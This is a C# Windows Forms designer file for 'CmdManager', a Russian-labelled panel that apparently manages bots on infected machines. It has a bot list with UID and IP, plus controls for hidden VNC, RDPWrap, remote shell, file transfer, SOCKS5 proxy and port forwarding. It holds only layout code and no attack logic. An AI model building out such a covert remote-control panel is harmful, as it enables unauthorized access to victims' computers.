namespace CmdManager
{
	partial class FormMain
	{
		/// <summary>
		/// Required designer variable.
		/// </summary>
		private System.ComponentModel.IContainer components = null;

		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		/// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
		protected override void Dispose(bool disposing)
		{
			if (disposing && (components != null))
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		#region Windows Form Designer generated code

		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		private void InitializeComponent()
		{
			this.components = new System.ComponentModel.Container();
			this.tableLayoutPanel1 = new System.Windows.Forms.TableLayoutPanel();
			this.tableLayoutPanel2 = new System.Windows.Forms.TableLayoutPanel();
			this.btRefresh = new System.Windows.Forms.Button();
			this.gridBots = new System.Windows.Forms.DataGridView();
			this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
			this.clnUID = new System.Windows.Forms.DataGridViewTextBoxColumn();
			this.clnIP = new System.Windows.Forms.DataGridViewTextBoxColumn();
			this.clnState = new System.Windows.Forms.DataGridViewTextBoxColumn();
			this.clnInfo = new System.Windows.Forms.DataGridViewTextBoxColumn();
			this.clnComment = new System.Windows.Forms.DataGridViewTextBoxColumn();
			this.contextMenuBots = new System.Windows.Forms.ContextMenuStrip(this.components);
			this.itemToGroup = new System.Windows.Forms.ToolStripMenuItem();
			this.panel2 = new System.Windows.Forms.Panel();
			this.tbCountBots = new System.Windows.Forms.TextBox();
			this.label1 = new System.Windows.Forms.Label();
			this.tbLog = new System.Windows.Forms.TextBox();
			this.treeGroup = new System.Windows.Forms.TreeView();
			this.panel1 = new System.Windows.Forms.Panel();
			this.btUpdateGroup = new System.Windows.Forms.Button();
			this.btDelGroup = new System.Windows.Forms.Button();
			this.btAddGroup = new System.Windows.Forms.Button();
			this.tbNameGroup = new System.Windows.Forms.TextBox();
			this.label7 = new System.Windows.Forms.Label();
			this.tableLayoutPanel3 = new System.Windows.Forms.TableLayoutPanel();
			this.tabsOpenBots = new System.Windows.Forms.TabControl();
			this.tbBots = new System.Windows.Forms.TabPage();
			this.tableLayoutPanel4 = new System.Windows.Forms.TableLayoutPanel();
			this.tbComment = new System.Windows.Forms.TextBox();
			this.label2 = new System.Windows.Forms.Label();
			this.btComment = new System.Windows.Forms.Button();
			this.tbUID = new System.Windows.Forms.TextBox();
			this.tbInfo = new System.Windows.Forms.TextBox();
			this.label3 = new System.Windows.Forms.Label();
			this.label5 = new System.Windows.Forms.Label();
			this.tbIP = new System.Windows.Forms.TextBox();
			this.tbState = new System.Windows.Forms.TextBox();
			this.label4 = new System.Windows.Forms.Label();
			this.panel4 = new System.Windows.Forms.Panel();
			this.groupBox1 = new System.Windows.Forms.GroupBox();
			this.label8 = new System.Windows.Forms.Label();
			this.tbSleepMin = new System.Windows.Forms.TextBox();
			this.btSleep = new System.Windows.Forms.Button();
			this.btOff = new System.Windows.Forms.Button();
			this.btCmdUser = new System.Windows.Forms.Button();
			this.btnPlayer = new System.Windows.Forms.Button();
			this.btRunHVNC = new System.Windows.Forms.Button();
			this.openVNCbtn = new System.Windows.Forms.Button();
			this.fullScreenBtn = new System.Windows.Forms.Button();
			this.btRDPWrap = new System.Windows.Forms.Button();
			this.btFileTransfer = new System.Windows.Forms.Button();
			this.btCmdExe = new System.Windows.Forms.Button();
			this.tbPortVNC = new System.Windows.Forms.TextBox();
			this.label6 = new System.Windows.Forms.Label();
			this.btRunVNC = new System.Windows.Forms.Button();
			this.btOnlineVideo = new System.Windows.Forms.Button();
			this.tbCmdBot = new System.Windows.Forms.TextBox();
			this.btCmdBot = new System.Windows.Forms.Button();
			this.btStartSocks5 = new System.Windows.Forms.Button();
			this.tbPortForward = new System.Windows.Forms.TextBox();
			this.btPortForward = new System.Windows.Forms.Button();
			this.btClosePortForward = new System.Windows.Forms.Button();
			this.btRunRDP = new System.Windows.Forms.Button();
			this.menuStrip1 = new System.Windows.Forms.MenuStrip();
			this.сервисToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.itemConfig = new System.Windows.Forms.ToolStripMenuItem();
			this.timerUpdateBots = new System.Windows.Forms.Timer(this.components);
			this.tableLayoutPanel1.SuspendLayout();
			this.tableLayoutPanel2.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)(this.gridBots)).BeginInit();
			this.contextMenuBots.SuspendLayout();
			this.panel2.SuspendLayout();
			this.panel1.SuspendLayout();
			this.tableLayoutPanel3.SuspendLayout();
			this.tabsOpenBots.SuspendLayout();
			this.tableLayoutPanel4.SuspendLayout();
			this.panel4.SuspendLayout();
			this.groupBox1.SuspendLayout();
			this.menuStrip1.SuspendLayout();
			this.SuspendLayout();
			// 
			// tableLayoutPanel1
			// 
			this.tableLayoutPanel1.ColumnCount = 2;
			this.tableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 40F));
			this.tableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 60F));
			this.tableLayoutPanel1.Controls.Add(this.tableLayoutPanel2, 0, 0);
			this.tableLayoutPanel1.Controls.Add(this.tableLayoutPanel3, 1, 0);
			this.tableLayoutPanel1.Dock = System.Windows.Forms.DockStyle.Fill;
			this.tableLayoutPanel1.Location = new System.Drawing.Point(0, 24);
			this.tableLayoutPanel1.Name = "tableLayoutPanel1";
			this.tableLayoutPanel1.RowCount = 1;
			this.tableLayoutPanel1.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100F));
			this.tableLayoutPanel1.Size = new System.Drawing.Size(1229, 679);
			this.tableLayoutPanel1.TabIndex = 0;
			// 
			// tableLayoutPanel2
			// 
			this.tableLayoutPanel2.ColumnCount = 2;
			this.tableLayoutPanel2.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 50F));
			this.tableLayoutPanel2.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 50F));
			this.tableLayoutPanel2.Controls.Add(this.btRefresh, 1, 2);
			this.tableLayoutPanel2.Controls.Add(this.gridBots, 0, 1);
			this.tableLayoutPanel2.Controls.Add(this.panel2, 0, 2);
			this.tableLayoutPanel2.Controls.Add(this.tbLog, 0, 3);
			this.tableLayoutPanel2.Controls.Add(this.treeGroup, 0, 0);
			this.tableLayoutPanel2.Controls.Add(this.panel1, 1, 0);
			this.tableLayoutPanel2.Dock = System.Windows.Forms.DockStyle.Fill;
			this.tableLayoutPanel2.Location = new System.Drawing.Point(3, 3);
			this.tableLayoutPanel2.Name = "tableLayoutPanel2";
			this.tableLayoutPanel2.RowCount = 4;
			this.tableLayoutPanel2.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 30F));
			this.tableLayoutPanel2.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 70F));
			this.tableLayoutPanel2.RowStyles.Add(new System.Windows.Forms.RowStyle());
			this.tableLayoutPanel2.RowStyles.Add(new System.Windows.Forms.RowStyle());
			this.tableLayoutPanel2.Size = new System.Drawing.Size(485, 673);
			this.tableLayoutPanel2.TabIndex = 0;
			// 
			// btRefresh
			// 
			this.btRefresh.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
			this.btRefresh.Location = new System.Drawing.Point(407, 523);
			this.btRefresh.Name = "btRefresh";
			this.btRefresh.Size = new System.Drawing.Size(75, 23);
			this.btRefresh.TabIndex = 0;
			this.btRefresh.Text = "Обновить";
			this.btRefresh.UseVisualStyleBackColor = true;
			this.btRefresh.Click += new System.EventHandler(this.btRefresh_Click);
			// 
			// gridBots
			// 
			this.gridBots.AllowUserToAddRows = false;
			this.gridBots.AllowUserToDeleteRows = false;
			this.gridBots.BorderStyle = System.Windows.Forms.BorderStyle.None;
			this.gridBots.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
			this.gridBots.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.Column1,
            this.clnUID,
            this.clnIP,
            this.clnState,
            this.clnInfo,
            this.clnComment});
			this.tableLayoutPanel2.SetColumnSpan(this.gridBots, 2);
			this.gridBots.ContextMenuStrip = this.contextMenuBots;
			this.gridBots.Dock = System.Windows.Forms.DockStyle.Fill;
			this.gridBots.Location = new System.Drawing.Point(3, 159);
			this.gridBots.MultiSelect = false;
			this.gridBots.Name = "gridBots";
			this.gridBots.ReadOnly = true;
			this.gridBots.RowHeadersVisible = false;
			this.gridBots.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
			this.gridBots.Size = new System.Drawing.Size(479, 358);
			this.gridBots.TabIndex = 0;
			this.gridBots.CellFormatting += new System.Windows.Forms.DataGridViewCellFormattingEventHandler(this.gridBots_CellFormatting);
			this.gridBots.RowEnter += new System.Windows.Forms.DataGridViewCellEventHandler(this.gridBots_RowEnter);
			// 
			// Column1
			// 
			this.Column1.HeaderText = "Группа";
			this.Column1.Name = "Column1";
			this.Column1.ReadOnly = true;
			// 
			// clnUID
			// 
			this.clnUID.DataPropertyName = "uid";
			this.clnUID.HeaderText = "UID";
			this.clnUID.Name = "clnUID";
			this.clnUID.ReadOnly = true;
			this.clnUID.Width = 150;
			// 
			// clnIP
			// 
			this.clnIP.DataPropertyName = "ip";
			this.clnIP.HeaderText = "IP";
			this.clnIP.Name = "clnIP";
			this.clnIP.ReadOnly = true;
			// 
			// clnState
			// 
			this.clnState.DataPropertyName = "ports";
			this.clnState.HeaderText = "Состояние";
			this.clnState.Name = "clnState";
			this.clnState.ReadOnly = true;
			this.clnState.Width = 200;
			// 
			// clnInfo
			// 
			this.clnInfo.DataPropertyName = "info";
			this.clnInfo.HeaderText = "Инфо";
			this.clnInfo.Name = "clnInfo";
			this.clnInfo.ReadOnly = true;
			this.clnInfo.Width = 300;
			// 
			// clnComment
			// 
			this.clnComment.DataPropertyName = "comment";
			this.clnComment.HeaderText = "Комментарий";
			this.clnComment.Name = "clnComment";
			this.clnComment.ReadOnly = true;
			this.clnComment.Width = 300;
			// 
			// contextMenuBots
			// 
			this.contextMenuBots.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.itemToGroup});
			this.contextMenuBots.Name = "contextMenuBots";
			this.contextMenuBots.Size = new System.Drawing.Size(123, 26);
			this.contextMenuBots.Opening += new System.ComponentModel.CancelEventHandler(this.contextMenuBots_Opening);
			// 
			// itemToGroup
			// 
			this.itemToGroup.Name = "itemToGroup";
			this.itemToGroup.Size = new System.Drawing.Size(122, 22);
			this.itemToGroup.Text = "В группу";
			// 
			// panel2
			// 
			this.panel2.AutoSize = true;
			this.panel2.Controls.Add(this.tbCountBots);
			this.panel2.Controls.Add(this.label1);
			this.panel2.Location = new System.Drawing.Point(3, 523);
			this.panel2.Name = "panel2";
			this.panel2.Size = new System.Drawing.Size(179, 26);
			this.panel2.TabIndex = 2;
			// 
			// tbCountBots
			// 
			this.tbCountBots.Location = new System.Drawing.Point(110, 3);
			this.tbCountBots.Name = "tbCountBots";
			this.tbCountBots.ReadOnly = true;
			this.tbCountBots.Size = new System.Drawing.Size(66, 20);
			this.tbCountBots.TabIndex = 1;
			// 
			// label1
			// 
			this.label1.AutoSize = true;
			this.label1.Location = new System.Drawing.Point(3, 6);
			this.label1.Name = "label1";
			this.label1.Size = new System.Drawing.Size(101, 13);
			this.label1.TabIndex = 0;
			this.label1.Text = "Количество ботов:";
			// 
			// tbLog
			// 
			this.tableLayoutPanel2.SetColumnSpan(this.tbLog, 2);
			this.tbLog.Dock = System.Windows.Forms.DockStyle.Fill;
			this.tbLog.Location = new System.Drawing.Point(3, 555);
			this.tbLog.Multiline = true;
			this.tbLog.Name = "tbLog";
			this.tbLog.ReadOnly = true;
			this.tbLog.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
			this.tbLog.Size = new System.Drawing.Size(479, 115);
			this.tbLog.TabIndex = 3;
			// 
			// treeGroup
			// 
			this.treeGroup.BackColor = System.Drawing.SystemColors.Control;
			this.treeGroup.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
			this.treeGroup.Dock = System.Windows.Forms.DockStyle.Fill;
			this.treeGroup.Location = new System.Drawing.Point(0, 0);
			this.treeGroup.Margin = new System.Windows.Forms.Padding(0);
			this.treeGroup.Name = "treeGroup";
			this.treeGroup.Size = new System.Drawing.Size(242, 156);
			this.treeGroup.TabIndex = 4;
			this.treeGroup.AfterSelect += new System.Windows.Forms.TreeViewEventHandler(this.treeGroup_AfterSelect);
			// 
			// panel1
			// 
			this.panel1.Controls.Add(this.btUpdateGroup);
			this.panel1.Controls.Add(this.btDelGroup);
			this.panel1.Controls.Add(this.btAddGroup);
			this.panel1.Controls.Add(this.tbNameGroup);
			this.panel1.Controls.Add(this.label7);
			this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
			this.panel1.Location = new System.Drawing.Point(245, 3);
			this.panel1.Name = "panel1";
			this.panel1.Size = new System.Drawing.Size(237, 150);
			this.panel1.TabIndex = 5;
			// 
			// btUpdateGroup
			// 
			this.btUpdateGroup.Location = new System.Drawing.Point(116, 128);
			this.btUpdateGroup.Name = "btUpdateGroup";
			this.btUpdateGroup.Size = new System.Drawing.Size(112, 23);
			this.btUpdateGroup.TabIndex = 4;
			this.btUpdateGroup.Text = "Обновить группу";
			this.btUpdateGroup.UseVisualStyleBackColor = true;
			this.btUpdateGroup.Click += new System.EventHandler(this.btUpdateGroup_Click);
			// 
			// btDelGroup
			// 
			this.btDelGroup.Location = new System.Drawing.Point(116, 99);
			this.btDelGroup.Name = "btDelGroup";
			this.btDelGroup.Size = new System.Drawing.Size(112, 23);
			this.btDelGroup.TabIndex = 3;
			this.btDelGroup.Text = "Удалить группу";
			this.btDelGroup.UseVisualStyleBackColor = true;
			this.btDelGroup.Click += new System.EventHandler(this.btDelGroup_Click);
			// 
			// btAddGroup
			// 
			this.btAddGroup.Location = new System.Drawing.Point(116, 72);
			this.btAddGroup.Name = "btAddGroup";
			this.btAddGroup.Size = new System.Drawing.Size(112, 23);
			this.btAddGroup.TabIndex = 2;
			this.btAddGroup.Text = "Добавить группу";
			this.btAddGroup.UseVisualStyleBackColor = true;
			this.btAddGroup.Click += new System.EventHandler(this.btAddGroup_Click);
			// 
			// tbNameGroup
			// 
			this.tbNameGroup.Location = new System.Drawing.Point(77, 3);
			this.tbNameGroup.Name = "tbNameGroup";
			this.tbNameGroup.Size = new System.Drawing.Size(151, 20);
			this.tbNameGroup.TabIndex = 1;
			// 
			// label7
			// 
			this.label7.AutoSize = true;
			this.label7.Location = new System.Drawing.Point(3, 6);
			this.label7.Name = "label7";
			this.label7.Size = new System.Drawing.Size(71, 13);
			this.label7.TabIndex = 0;
			this.label7.Text = "Имя группы:";
			// 
			// tableLayoutPanel3
			// 
			this.tableLayoutPanel3.ColumnCount = 1;
			this.tableLayoutPanel3.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 100F));
			this.tableLayoutPanel3.Controls.Add(this.tabsOpenBots, 0, 1);
			this.tableLayoutPanel3.Controls.Add(this.tableLayoutPanel4, 0, 0);
			this.tableLayoutPanel3.Dock = System.Windows.Forms.DockStyle.Fill;
			this.tableLayoutPanel3.Location = new System.Drawing.Point(494, 3);
			this.tableLayoutPanel3.Name = "tableLayoutPanel3";
			this.tableLayoutPanel3.RowCount = 2;
			this.tableLayoutPanel3.RowStyles.Add(new System.Windows.Forms.RowStyle());
			this.tableLayoutPanel3.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100F));
			this.tableLayoutPanel3.Size = new System.Drawing.Size(732, 673);
			this.tableLayoutPanel3.TabIndex = 1;
			// 
			// tabsOpenBots
			// 
			this.tabsOpenBots.Alignment = System.Windows.Forms.TabAlignment.Left;
			this.tabsOpenBots.Controls.Add(this.tbBots);
			this.tabsOpenBots.Dock = System.Windows.Forms.DockStyle.Fill;
			this.tabsOpenBots.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed;
			this.tabsOpenBots.ItemSize = new System.Drawing.Size(25, 150);
			this.tabsOpenBots.Location = new System.Drawing.Point(3, 195);
			this.tabsOpenBots.Multiline = true;
			this.tabsOpenBots.Name = "tabsOpenBots";
			this.tabsOpenBots.SelectedIndex = 0;
			this.tabsOpenBots.Size = new System.Drawing.Size(726, 475);
			this.tabsOpenBots.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
			this.tabsOpenBots.TabIndex = 0;
			this.tabsOpenBots.DrawItem += new System.Windows.Forms.DrawItemEventHandler(this.tabsOpenBots_DrawItem);
			this.tabsOpenBots.MouseDown += new System.Windows.Forms.MouseEventHandler(this.tabsOpenBots_MouseDown);
			// 
			// tbBots
			// 
			this.tbBots.Location = new System.Drawing.Point(154, 4);
			this.tbBots.Name = "tbBots";
			this.tbBots.Padding = new System.Windows.Forms.Padding(3);
			this.tbBots.Size = new System.Drawing.Size(568, 467);
			this.tbBots.TabIndex = 1;
			this.tbBots.UseVisualStyleBackColor = true;
			// 
			// tableLayoutPanel4
			// 
			this.tableLayoutPanel4.AutoSize = true;
			this.tableLayoutPanel4.ColumnCount = 6;
			this.tableLayoutPanel4.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle());
			this.tableLayoutPanel4.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle());
			this.tableLayoutPanel4.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle());
			this.tableLayoutPanel4.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle());
			this.tableLayoutPanel4.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle());
			this.tableLayoutPanel4.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle());
			this.tableLayoutPanel4.Controls.Add(this.tbComment, 5, 1);
			this.tableLayoutPanel4.Controls.Add(this.label2, 0, 0);
			this.tableLayoutPanel4.Controls.Add(this.btComment, 4, 1);
			this.tableLayoutPanel4.Controls.Add(this.tbUID, 1, 0);
			this.tableLayoutPanel4.Controls.Add(this.tbInfo, 1, 1);
			this.tableLayoutPanel4.Controls.Add(this.label3, 2, 0);
			this.tableLayoutPanel4.Controls.Add(this.label5, 0, 1);
			this.tableLayoutPanel4.Controls.Add(this.tbIP, 3, 0);
			this.tableLayoutPanel4.Controls.Add(this.tbState, 5, 0);
			this.tableLayoutPanel4.Controls.Add(this.label4, 4, 0);
			this.tableLayoutPanel4.Controls.Add(this.panel4, 0, 2);
			this.tableLayoutPanel4.Dock = System.Windows.Forms.DockStyle.Fill;
			this.tableLayoutPanel4.Location = new System.Drawing.Point(3, 3);
			this.tableLayoutPanel4.Name = "tableLayoutPanel4";
			this.tableLayoutPanel4.RowCount = 3;
			this.tableLayoutPanel4.RowStyles.Add(new System.Windows.Forms.RowStyle());
			this.tableLayoutPanel4.RowStyles.Add(new System.Windows.Forms.RowStyle());
			this.tableLayoutPanel4.RowStyles.Add(new System.Windows.Forms.RowStyle());
			this.tableLayoutPanel4.Size = new System.Drawing.Size(726, 186);
			this.tableLayoutPanel4.TabIndex = 2;
			// 
			// tbComment
			// 
			this.tbComment.Dock = System.Windows.Forms.DockStyle.Fill;
			this.tbComment.Location = new System.Drawing.Point(409, 29);
			this.tbComment.Name = "tbComment";
			this.tbComment.Size = new System.Drawing.Size(331, 20);
			this.tbComment.TabIndex = 9;
			// 
			// label2
			// 
			this.label2.Anchor = System.Windows.Forms.AnchorStyles.Left;
			this.label2.AutoSize = true;
			this.label2.Location = new System.Drawing.Point(3, 6);
			this.label2.Name = "label2";
			this.label2.Size = new System.Drawing.Size(29, 13);
			this.label2.TabIndex = 0;
			this.label2.Text = "UID:";
			// 
			// btComment
			// 
			this.btComment.Anchor = System.Windows.Forms.AnchorStyles.Left;
			this.btComment.Location = new System.Drawing.Point(314, 29);
			this.btComment.Name = "btComment";
			this.btComment.Size = new System.Drawing.Size(89, 23);
			this.btComment.TabIndex = 8;
			this.btComment.Text = "Комментарий";
			this.btComment.UseVisualStyleBackColor = true;
			this.btComment.Click += new System.EventHandler(this.btComment_Click);
			// 
			// tbUID
			// 
			this.tbUID.Anchor = System.Windows.Forms.AnchorStyles.Left;
			this.tbUID.Location = new System.Drawing.Point(47, 3);
			this.tbUID.Name = "tbUID";
			this.tbUID.ReadOnly = true;
			this.tbUID.Size = new System.Drawing.Size(125, 20);
			this.tbUID.TabIndex = 1;
			// 
			// tbInfo
			// 
			this.tableLayoutPanel4.SetColumnSpan(this.tbInfo, 3);
			this.tbInfo.Dock = System.Windows.Forms.DockStyle.Fill;
			this.tbInfo.Location = new System.Drawing.Point(47, 29);
			this.tbInfo.Name = "tbInfo";
			this.tbInfo.ReadOnly = true;
			this.tbInfo.Size = new System.Drawing.Size(261, 20);
			this.tbInfo.TabIndex = 7;
			// 
			// label3
			// 
			this.label3.Anchor = System.Windows.Forms.AnchorStyles.Left;
			this.label3.AutoSize = true;
			this.label3.Location = new System.Drawing.Point(178, 6);
			this.label3.Name = "label3";
			this.label3.Size = new System.Drawing.Size(20, 13);
			this.label3.TabIndex = 2;
			this.label3.Text = "IP:";
			// 
			// label5
			// 
			this.label5.Anchor = System.Windows.Forms.AnchorStyles.Left;
			this.label5.AutoSize = true;
			this.label5.Location = new System.Drawing.Point(3, 34);
			this.label5.Name = "label5";
			this.label5.Size = new System.Drawing.Size(38, 13);
			this.label5.TabIndex = 6;
			this.label5.Text = "Инфо:";
			// 
			// tbIP
			// 
			this.tbIP.Anchor = System.Windows.Forms.AnchorStyles.Left;
			this.tbIP.Location = new System.Drawing.Point(204, 3);
			this.tbIP.Name = "tbIP";
			this.tbIP.ReadOnly = true;
			this.tbIP.Size = new System.Drawing.Size(100, 20);
			this.tbIP.TabIndex = 3;
			// 
			// tbState
			// 
			this.tbState.Dock = System.Windows.Forms.DockStyle.Fill;
			this.tbState.Location = new System.Drawing.Point(409, 3);
			this.tbState.Name = "tbState";
			this.tbState.ReadOnly = true;
			this.tbState.Size = new System.Drawing.Size(331, 20);
			this.tbState.TabIndex = 5;
			// 
			// label4
			// 
			this.label4.Anchor = System.Windows.Forms.AnchorStyles.Left;
			this.label4.AutoSize = true;
			this.label4.Location = new System.Drawing.Point(314, 6);
			this.label4.Name = "label4";
			this.label4.Size = new System.Drawing.Size(64, 13);
			this.label4.TabIndex = 4;
			this.label4.Text = "Состояние:";
			// 
			// panel4
			// 
			this.panel4.AutoSize = true;
			this.tableLayoutPanel4.SetColumnSpan(this.panel4, 6);
			this.panel4.Controls.Add(this.groupBox1);
			this.panel4.Location = new System.Drawing.Point(3, 58);
			this.panel4.Name = "panel4";
			this.panel4.Size = new System.Drawing.Size(722, 125);
			this.panel4.TabIndex = 10;
			// 
			// groupBox1
			// 
			this.groupBox1.Controls.Add(this.label8);
			this.groupBox1.Controls.Add(this.tbSleepMin);
			this.groupBox1.Controls.Add(this.btSleep);
			this.groupBox1.Controls.Add(this.btOff);
			this.groupBox1.Controls.Add(this.btCmdUser);
			this.groupBox1.Controls.Add(this.btnPlayer);
			this.groupBox1.Controls.Add(this.btRunHVNC);
			this.groupBox1.Controls.Add(this.openVNCbtn);
			this.groupBox1.Controls.Add(this.fullScreenBtn);
			this.groupBox1.Controls.Add(this.btRDPWrap);
			this.groupBox1.Controls.Add(this.btFileTransfer);
			this.groupBox1.Controls.Add(this.btCmdExe);
			this.groupBox1.Controls.Add(this.tbPortVNC);
			this.groupBox1.Controls.Add(this.label6);
			this.groupBox1.Controls.Add(this.btRunVNC);
			this.groupBox1.Controls.Add(this.btOnlineVideo);
			this.groupBox1.Controls.Add(this.tbCmdBot);
			this.groupBox1.Controls.Add(this.btCmdBot);
			this.groupBox1.Controls.Add(this.btStartSocks5);
			this.groupBox1.Controls.Add(this.tbPortForward);
			this.groupBox1.Controls.Add(this.btPortForward);
			this.groupBox1.Controls.Add(this.btClosePortForward);
			this.groupBox1.Controls.Add(this.btRunRDP);
			this.groupBox1.Location = new System.Drawing.Point(3, 3);
			this.groupBox1.Name = "groupBox1";
			this.groupBox1.Size = new System.Drawing.Size(716, 119);
			this.groupBox1.TabIndex = 0;
			this.groupBox1.TabStop = false;
			this.groupBox1.Text = "Команды";
			// 
			// label8
			// 
			this.label8.AutoSize = true;
			this.label8.Location = new System.Drawing.Point(211, 101);
			this.label8.Name = "label8";
			this.label8.Size = new System.Drawing.Size(30, 13);
			this.label8.TabIndex = 41;
			this.label8.Text = "мин.";
			// 
			// tbSleepMin
			// 
			this.tbSleepMin.Location = new System.Drawing.Point(162, 98);
			this.tbSleepMin.Name = "tbSleepMin";
			this.tbSleepMin.Size = new System.Drawing.Size(46, 20);
			this.tbSleepMin.TabIndex = 40;
			// 
			// btSleep
			// 
			this.btSleep.Location = new System.Drawing.Point(87, 96);
			this.btSleep.Name = "btSleep";
			this.btSleep.Size = new System.Drawing.Size(75, 23);
			this.btSleep.TabIndex = 39;
			this.btSleep.Text = "Заснуть";
			this.btSleep.UseVisualStyleBackColor = true;
			this.btSleep.Click += new System.EventHandler(this.btSleep_Click);
			// 
			// btOff
			// 
			this.btOff.Location = new System.Drawing.Point(6, 96);
			this.btOff.Name = "btOff";
			this.btOff.Size = new System.Drawing.Size(75, 23);
			this.btOff.TabIndex = 38;
			this.btOff.Text = "Отключить";
			this.btOff.UseVisualStyleBackColor = true;
			this.btOff.Click += new System.EventHandler(this.btOff_Click);
			// 
			// btCmdUser
			// 
			this.btCmdUser.Location = new System.Drawing.Point(540, 47);
			this.btCmdUser.Name = "btCmdUser";
			this.btCmdUser.Size = new System.Drawing.Size(62, 23);
			this.btCmdUser.TabIndex = 37;
			this.btCmdUser.Text = "cmd user";
			this.btCmdUser.UseVisualStyleBackColor = true;
			this.btCmdUser.Click += new System.EventHandler(this.btCmdUser_Click);
			// 
			// btnPlayer
			// 
			this.btnPlayer.Location = new System.Drawing.Point(661, 18);
			this.btnPlayer.Margin = new System.Windows.Forms.Padding(2);
			this.btnPlayer.Name = "btnPlayer";
			this.btnPlayer.Size = new System.Drawing.Size(50, 24);
			this.btnPlayer.TabIndex = 36;
			this.btnPlayer.Text = "плеер";
			this.btnPlayer.UseVisualStyleBackColor = true;
			this.btnPlayer.Click += new System.EventHandler(this.btnPlayer_Click);
			// 
			// btRunHVNC
			// 
			this.btRunHVNC.Location = new System.Drawing.Point(66, 47);
			this.btRunHVNC.Name = "btRunHVNC";
			this.btRunHVNC.Size = new System.Drawing.Size(51, 23);
			this.btRunHVNC.TabIndex = 35;
			this.btRunHVNC.Text = "HVNC";
			this.btRunHVNC.UseVisualStyleBackColor = true;
			this.btRunHVNC.Click += new System.EventHandler(this.btRunHVNC_Click);
			// 
			// openVNCbtn
			// 
			this.openVNCbtn.Location = new System.Drawing.Point(607, 72);
			this.openVNCbtn.Margin = new System.Windows.Forms.Padding(2);
			this.openVNCbtn.Name = "openVNCbtn";
			this.openVNCbtn.Size = new System.Drawing.Size(104, 23);
			this.openVNCbtn.TabIndex = 34;
			this.openVNCbtn.Text = "Полноэкр. VNC";
			this.openVNCbtn.UseVisualStyleBackColor = true;
			this.openVNCbtn.Click += new System.EventHandler(this.openVNCBtn_Click);
			// 
			// fullScreenBtn
			// 
			this.fullScreenBtn.Location = new System.Drawing.Point(607, 46);
			this.fullScreenBtn.Margin = new System.Windows.Forms.Padding(2);
			this.fullScreenBtn.Name = "fullScreenBtn";
			this.fullScreenBtn.Size = new System.Drawing.Size(104, 24);
			this.fullScreenBtn.TabIndex = 34;
			this.fullScreenBtn.Text = "Полноэкр. видео";
			this.fullScreenBtn.UseVisualStyleBackColor = true;
			this.fullScreenBtn.Click += new System.EventHandler(this.fullScreenBtn_Click);
			// 
			// btRDPWrap
			// 
			this.btRDPWrap.Location = new System.Drawing.Point(579, 19);
			this.btRDPWrap.Name = "btRDPWrap";
			this.btRDPWrap.Size = new System.Drawing.Size(77, 23);
			this.btRDPWrap.TabIndex = 33;
			this.btRDPWrap.Text = "RDPWrap";
			this.btRDPWrap.UseVisualStyleBackColor = true;
			this.btRDPWrap.Click += new System.EventHandler(this.btRDPWrap_Click);
			// 
			// btFileTransfer
			// 
			this.btFileTransfer.Location = new System.Drawing.Point(488, 72);
			this.btFileTransfer.Name = "btFileTransfer";
			this.btFileTransfer.Size = new System.Drawing.Size(114, 23);
			this.btFileTransfer.TabIndex = 32;
			this.btFileTransfer.Text = "Файл трансфер";
			this.btFileTransfer.UseVisualStyleBackColor = true;
			this.btFileTransfer.Click += new System.EventHandler(this.btFileTransfer_Click);
			// 
			// btCmdExe
			// 
			this.btCmdExe.Location = new System.Drawing.Point(472, 47);
			this.btCmdExe.Name = "btCmdExe";
			this.btCmdExe.Size = new System.Drawing.Size(62, 23);
			this.btCmdExe.TabIndex = 31;
			this.btCmdExe.Text = "cmd";
			this.btCmdExe.UseVisualStyleBackColor = true;
			this.btCmdExe.Click += new System.EventHandler(this.btCmdExe_Click);
			// 
			// tbPortVNC
			// 
			this.tbPortVNC.Location = new System.Drawing.Point(162, 49);
			this.tbPortVNC.Name = "tbPortVNC";
			this.tbPortVNC.Size = new System.Drawing.Size(46, 20);
			this.tbPortVNC.TabIndex = 30;
			this.tbPortVNC.Text = "0";
			// 
			// label6
			// 
			this.label6.AutoSize = true;
			this.label6.Location = new System.Drawing.Point(123, 52);
			this.label6.Name = "label6";
			this.label6.Size = new System.Drawing.Size(33, 13);
			this.label6.TabIndex = 29;
			this.label6.Text = "порт:";
			// 
			// btRunVNC
			// 
			this.btRunVNC.Location = new System.Drawing.Point(6, 47);
